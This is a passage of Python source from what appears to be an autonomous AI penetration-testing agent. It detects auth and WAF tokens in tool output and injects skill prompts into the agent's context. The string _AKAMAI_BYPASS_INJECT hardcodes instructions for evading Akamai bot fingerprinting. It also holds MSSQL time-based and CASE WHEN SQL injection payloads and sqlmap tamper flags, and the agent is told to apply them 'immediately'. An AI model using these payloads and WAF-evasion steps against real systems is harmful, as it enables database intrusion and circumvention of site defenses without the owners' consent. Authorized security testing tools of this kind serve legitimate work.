            if results:
                for r in results[:3]:
                    prompt = se.get_skill_prompt(r.get("id", ""))
                    if prompt:
                        parts.append(prompt[:1000])

            # 로컬 스킬 라우팅 — keyword 분해 버전으로 매칭
            local_ctx = se.local_skill_context(keyword, max_chars=2000)
            if local_ctx:
                parts.append(local_ctx)

            return "\n".join(parts)
        except Exception:
            pass
        return ""

    # ── 동적 스킬 주입 키워드 ────────────────────────────────────────────────
    _DYNAMIC_SKILL_TRIGGERS: list[tuple[list[str], str]] = [
        # (tool output keywords, skill keyword to inject)
        (["USER_SRP_AUTH", "SRP_B", "SECRET_BLOCK", "PASSWORD_VERIFIER",
          "ChallengeParameters", "CognitoIdentity", "cognito"],
         "cognito srp aws"),
        (["InitiateAuth", "RespondToAuthChallenge", "user pool", "userPool"],
         "cognito srp aws auth"),
        (["graphql", "GraphQL", "__schema", "__typename"],
         "graphql api fuzz"),
        (["<wsse:", "saml", "SAML", "SAMLResponse", "Assertion"],
         "oauth oidc auth"),
        # Akamai Bot Manager fingerprint tokens
        (["ak_bmsc", "_abck", "AkamaiGHost", "akamai-grn", "bm_sv", "x-check-cacheable"],
         "akamai bypass"),
    ]

    # Akamai bypass injection — injected directly without skill DB lookup
    _AKAMAI_BYPASS_INJECT = (
        "[AKAMAI WAF DETECTED — BYPASS PROTOCOL ACTIVE]\n"
        "Akamai Bot Manager identified. Apply immediately:\n"
        "1. Use httpx HTTP/2 (not curl/requests) — evades JA3/JA4 TLS fingerprinting:\n"
        "   import httpx\n"
        "   client = httpx.Client(http2=True, follow_redirects=True, timeout=30,\n"
        "       headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n"
        "                'Accept':'text/html,application/xhtml+xml,*/*;q=0.8',\n"
        "                'Accept-Language':'ko-KR,ko;q=0.9,en-US;q=0.8'})\n"
        "   REUSE this client for ALL requests — do NOT create new session per probe.\n"
        "2. Boolean SQLi blocked (AND/OR) → CASE WHEN bypass:\n"
        "   '+(CASE WHEN 1=1 THEN 1 ELSE 0 END)+'\n"
        "3. MSSQL time-based (NO AND/OR needed — Akamai often passes WAITFOR):\n"
        "   '; WAITFOR DELAY '0:0:5'--\n"
        "   '; IF(1=1) WAITFOR DELAY '0:0:5'--\n"
        "   Binary: IF(UNICODE(LEFT(db_name(),1))>64) WAITFOR DELAY '0:0:3'--\n"
        "4. SUBSTRING blocked → LEFT()/UNICODE(LEFT()) for char extraction\n"
        "5. sqlmap: --technique=T --time-sec=5 --timeout=60 "
        "--tamper=charencode,randomcase,space2comment --random-agent --delay=5\n"
        "⛔ Boolean keyword block ≠ not injectable. Time-based is a separate bypass path."
    )

    def _maybe_inject_dynamic_skill(self, tool_output: str) -> None:
        """Check tool output for well-known auth/protocol tokens and inject
        the corresponding skill context into pending injections if not yet seen."""
        if not tool_output:
            return
        try:
            from ..skills.engine import SkillEngine
            se = SkillEngine()
            for trigger_words, skill_keyword in self._DYNAMIC_SKILL_TRIGGERS:
                if any(w in tool_output for w in trigger_words):
                    sig = f"dynamic_skill_{trigger_words[0]}"
                    if sig in self._nudged_finding_ids:
                        continue
                    self._nudged_finding_ids.add(sig)
                    # Akamai: inject hardcoded bypass protocol directly
                    if "akamai" in skill_keyword:
                        self._pending_injections.append(self._AKAMAI_BYPASS_INJECT)
                        continue
                    ctx = se.local_skill_context(skill_keyword, max_chars=1500)
                    if ctx:
                        inject = (
                            f"[SKILL CONTEXT — auto-detected {trigger_words[0]}]\n"
                            f"{ctx}\n"
                            f"Use `from bingo.tools.cognito_srp import authenticate_srp` "
                            f"instead of writing SRP from scratch."
                            if "cognito" in skill_keyword.lower() else
                            f"[SKILL CONTEXT — auto-detected {trigger_words[0]}]\n{ctx}"
                        )
                        self._pending_injections.append(inject)
        except Exception:
            pass

    @staticmethod
    def _estimate_loop_budget(target: str) -> int:
        """Estimate max loops based on target complexity keywords."""
        t = target.lower()
        # High complexity: cloud / container / multi-service environments
        if any(k in t for k in ["amazonaws", "azure", "k8s", "kubernetes", "gitlab", "jenkins", "github"]):
            return 120
        # Medium complexity: API-heavy / auth services
        if any(k in t for k in ["api", "graphql", "cognito", "oauth", "sso", "saml"]):
            return 100
        # Default: standard web app (raised from 80 → 100 to avoid premature cutoff)
        return 100

    def _build_context_injection(self) -> str:
        """Build context to inject into system prompt: KB + Skills + TaskGraph."""
        parts = []
        if self._kb_context:
            parts.append(f"\n## KNOWLEDGE BASE (auto-loaded)\n{self._kb_context}")
        if self._skill_context:
            parts.append(f"\n## RELEVANT SKILLS\n{self._skill_context[:3000]}")
        tg = self.task_graph.render()
        if tg:
            parts.append(f"\n## TASK GRAPH\n{tg}")
            parts.append(
                "\nFollow the task graph phases in order. "
                "Complete recon before moving to crawl, complete crawl before exploit attempts."
            )
        return "\n".join(parts) if parts else ""
